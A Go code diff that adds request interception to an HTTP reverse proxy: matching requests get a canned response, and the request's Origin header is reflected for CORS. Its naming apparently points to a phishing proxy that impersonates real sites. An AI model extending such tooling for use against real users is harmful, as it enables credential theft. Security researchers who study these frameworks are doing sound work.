@@ -459,6 +459,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// check if request should be intercepted
+				if pl != nil {
+					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+						for _, ic := range pl.intercept {
+							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
+								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+							}
+						}
+					}
+				}
 				// replace "Host" header
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
@@ -1047,6 +1059,21 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		if resp != nil {
 			return req, resp
 		}
+	}
+	return req, nil
+}
+
+func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
+	if mime == "" {
+		mime = "text/plain"
+	}
+	resp := goproxy.NewResponse(req, mime, http_status, body)
+	if resp != nil {
+		origin := req.Header.Get("Origin")
+		if origin != "" {
+			resp.Header.Set("Access-Control-Allow-Origin", origin)
+		}
+		return req, resp
 	}
 	return req, nil
 }
